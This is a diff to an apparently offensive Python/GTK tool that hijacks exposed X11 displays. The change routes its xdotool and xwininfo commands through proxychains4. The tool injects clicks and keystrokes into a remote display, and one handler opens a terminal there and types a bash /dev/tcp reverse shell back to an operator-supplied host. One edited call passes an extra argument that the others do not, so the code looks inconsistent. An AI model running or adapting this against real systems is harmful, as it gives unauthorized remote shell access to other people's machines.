@@ -19,6 +19,8 @@ from gi.repository import Gtk
 import cairo
 import socket
 
+cmd_prefix = "proxychains4 "
+
 class xwin:
 	host = ''
 	xww = True
@@ -28,7 +30,7 @@ class xwin:
 	alt_state = False
 
 	def on_click(self, widget, event):
-		cmd = 'export DISPLAY={} && xdotool mousemove {} {}'.format(self.host, event.x, event.y)
+		cmd = 'export DISPLAY={} && {}xdotool mousemove {} {}'.format(self.host, cmd_prefix, event.x, event.y)
 		if (event.button == 1):
 			cmd += ' click 1'
 		elif (event.button == 3):
@@ -80,25 +82,25 @@ class xwin:
 			dest = entry_text.split(' ')
 		else:
 			dest = entry_text.split(':')
-		cmd = 'export DISPLAY={} && xdotool key ctrl+alt+t'.format(self.host)
+		cmd = 'export DISPLAY={} && {}xdotool key ctrl+alt+t'.format(self.host, cmd_prefix)
 		os.system(cmd)
 		time.sleep(3)
 		cmd = 'echo "exec 5<>/dev/tcp/{}/{} && cat <&5 | /bin/bash 2>&5 >&5" | /bin/bash'.format(dest[0], dest[1])
-		cmd = 'export DISPLAY={} && xdotool key {}'.format(self.host, self.string_to_xdo(cmd, entry))
+		cmd = 'export DISPLAY={} && {}xdotool key {}'.format(self.host, self.string_to_xdo(cmd, cmd_prefix, entry))
 		os.system(cmd)
 		time.sleep(5)
-		cmd = 'export DISPLAY={} && xdotool key Return'.format(self.host)
+		cmd = 'export DISPLAY={} && {}xdotool key Return'.format(self.host, cmd_prefix)
 		os.system(cmd)
-		cmd = 'export DISPLAY={} && xdotool key ctrl+super+Down'.format(self.host)
+		cmd = 'export DISPLAY={} && {}xdotool key ctrl+super+Down'.format(self.host, cmd_prefix)
 		os.system(cmd)
 		
 
 	def on_backspace_clicked(self, button):
-		cmd = 'export DISPLAY={} && xdotool key BackSpace'.format(self.host)
+		cmd = 'export DISPLAY={} && {}xdotool key BackSpace'.format(self.host, cmd_prefix)
 		os.system(cmd)
 
 	def on_enter_clicked(self, button):
-		cmd = 'export DISPLAY={} && xdotool key Return'.format(self.host)
+		cmd = 'export DISPLAY={} && {}xdotool key Return'.format(self.host, cmd_prefix)
 		os.system(cmd)
 
 	def on_button_toggled(self, button, name):
@@ -120,7 +122,7 @@ class xwin:
 	def enter_callback(self, widget, entry):
 		entry_text = entry.get_text()
 		entry.set_text("")
-		cmd = 'export DISPLAY={} && xdotool key {}'.format(self.host, self.string_to_xdo(entry_text, entry))
+		cmd = 'export DISPLAY={} && {}xdotool key {}'.format(self.host, cmd_prefix, self.string_to_xdo(entry_text, entry))
 		os.system(cmd)
 
 	def expose(self, widget, event):
@@ -295,12 +297,12 @@ thomas@sensepost.com
 	except IndexError:
 		host = sys.argv[1]
 
-	valid = re.match(r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d{1,2}$", host)
+	valid = re.match(r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d{1,5}$", host)
 	if valid:
 		if not valid_ip(host.split(':')[0]):
 			print('Invalid IP address.')
 			quit()
-		if (int(host.split(':')[1]) > 63):
+		if (int(host.split(':')[1]) > 65535):
 			print('Invalid diplay number.')
 			quit()
 	else:
@@ -308,7 +310,7 @@ thomas@sensepost.com
 		quit()
 
 	try:
-		xwininfo = "xwininfo -root -display {}".format(host)
+		xwininfo = "{}xwininfo -root -display {}".format(cmd_prefix, host)
 		dpinfo = subprocess.check_output(xwininfo, shell=True, stdin=subprocess.PIPE, stderr=subprocess.STDOUT).decode('ASCII')
 		winid = re.search('Window id: 0x[0-9a-fA-F]+', dpinfo)
 		winid = winid.group(0).split(' ')
@@ -323,11 +325,11 @@ thomas@sensepost.com
 		winheight = int(winheight[1])
 
 		if disp:
-			xwatchwin = "xwatchwin {} -w {} > /dev/null".format(host, winid)
+			xwatchwin = "{}xwatchwin {} -w {} > /dev/null".format(cmd_prefix, host, winid)
 			xww = subprocess.Popen(xwatchwin, shell=True)
 			time.sleep(2)
 
-			xwinmove = "xdotool getactivewindow windowmove 100 100"
+			xwinmove = "{}xdotool getactivewindow windowmove 100 100".format(cmd_prefix)
 			os.system(xwinmove)
 
 			overlay = xwin(winwidth, winheight)
